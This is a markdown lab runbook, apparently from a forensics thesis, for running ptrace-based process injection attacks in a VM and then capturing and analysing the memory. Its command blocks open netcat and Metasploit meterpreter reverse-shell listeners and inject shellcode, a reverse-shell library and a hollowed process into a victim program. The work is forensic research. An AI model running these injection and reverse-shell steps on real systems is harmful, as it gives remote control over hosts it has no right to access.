# Ptrace techniques userland experiment deployment

Execute commands step-by-step by copying from code blocks below.  

## COMMON SETUP

```bash
cd ~/thesis

# Configuration variables
VM='ubuntu22-forensics' \
SSH='ubuntu-22' \
SNAP='clean-vanilla' \
EXP='shellcode_inject_fa_u22' # CHANGE HERE W/ CORRECT EXPERIMENT

# Create dir for experiments results
mkdir -p experiments/$EXP

# Reset VM to clean snapshot
virsh snapshot-revert $VM $SNAP && virsh start $VM
sleep 10

```

---

## SHELLCODE INJECT FOREIGN ALLOCATION

```bash
# Copy exploit to VM
scp ~/thesis/attack_tools/Ptrace/bin/shellcode_inject_fa $SSH:/tmp/

# Copy victim program to VM
scp ~/thesis/attack_tools/Ptrace/bin/victim $SSH:/tmp/

# [INTO ANOTHER TERMINAL] Open reverse shell listener 
nc -lvp 4444 

# SSH into VM for installation
ssh $SSH

# Execute victim first (in bg, output redirected to /dev/null)
/tmp/victim &> /dev/null &

# Execute exploit
/tmp/shellcode_inject_fa $(pgrep victim)

# Verify obtained reverse shell in Terminal 2
whoami
id

# Keep it open Terminal 2 for mem artifact
# Exit from SSH in Terminal 1  
exit

```
## SHELLCODE INJECT FOREIGN ALLOCATION

Identical to the previous one.. just change `shellcode_inject_fa` into `shellcode_inject_rip` when needed.

## LIBRARY INJECTION

```bash
# Copy exploit to VM
scp ~/thesis/attack_tools/Ptrace/bin/lib_inject $SSH:/tmp/

# Copy malicious lib to VM
scp ~/thesis/attack_tools/Ptrace/bin/lib_rev.so $SSH:/tmp/

# Copy victim program to VM
scp ~/thesis/attack_tools/Ptrace/bin/victim $SSH:/tmp/

# [INTO ANOTHER TERMINAL] Open reverse shell listener 
nc -lvp 4444 

# SSH into VM for installation
ssh $SSH

# Execute victim first (in bg, output redirected to /dev/null)
/tmp/victim &> /dev/null &

# Execute exploit
/tmp/lib_inject /tmp/lib_rev.so $(pgrep victim)

# Verify obtained reverse shell in Terminal 2
whoami
id

# Keep it open Terminal 2 for mem artifact
# Exit from SSH in Terminal 1  
exit
```

## PROCESS HOLLOWING

```bash
# Copy exploit to VM
scp ~/thesis/attack_tools/Ptrace/bin/hollow $SSH:/tmp/

# [INTO ANOTHER TERMINAL] Open meterpreter listener 
msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.100.1; set LPORT 4444; run"

# SSH into VM for installation
ssh $SSH

# Execute hollow
/tmp/hollow /bin/bash

# Verify obtained reverse shell in meterpreter
meterpreter > dir
meterpreter > ps

# Spawn a shell [just to leave some artifact]
meterpreter > shell
whoami
id
# Keep it open for mem artifact

# In terminal 1, exit from SSH
exit
```

## DUMP AND ANALYZE MEMORY

```bash

cd scripts/

./acquisition/acquire.sh $VM $EXP --memory

MEM_DUMP=~/thesis/experiments/$EXP/memory.dump

./analysis/mem_analyze.sh $MEM_DUMP $(dirname $MEM_DUMP)/mem_analysis

```